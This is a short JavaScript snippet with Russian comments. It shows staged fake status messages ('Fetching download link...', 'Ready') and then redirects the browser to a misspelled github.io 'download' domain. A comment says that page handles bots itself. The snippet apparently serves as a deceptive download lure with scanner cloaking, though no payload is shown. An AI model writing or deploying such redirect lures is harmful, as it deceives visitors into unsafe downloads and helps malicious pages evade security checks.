(function(){
  var loader = document.getElementById('loader');
  var status = document.getElementById('status');
  
  // Обновляем статус
  status.textContent = 'Connecting...';
  loader.textContent = 'Fetching download link...';
  
  // Добавляем небольшую задержку для эффекта
  setTimeout(function() {
    status.textContent = 'Processing...';
    loader.textContent = 'Redirecting…';
    status.textContent = 'Ready';
    
    // Прямой редирект на страницу, которая сама разберется с ботами
    setTimeout(function(){
      window.location.href = 'https://downloa-file.github.io/link/';
    }, 2000);
  }, 1000);
})();
